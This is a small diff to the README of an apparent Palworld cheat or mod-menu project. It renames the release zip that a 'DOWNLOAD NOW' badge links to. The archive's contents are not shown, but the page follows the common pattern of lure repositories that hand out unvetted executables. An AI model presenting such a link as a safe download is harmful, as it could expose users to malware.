@@ -31,10 +31,11 @@ The Palworld Mod Menu is a fully interactive UI that appears in-game, giving you
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/hectootokagejoist/Palworld-Ultimate-Mod/releases/download/24/PalworldUltimateMOD.zip">
+  <a href="https://github.com/hectootokagejoist/Palworld-Ultimate-Mod/releases/download/24/PalworldUltimate.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
+
 
 ---
 
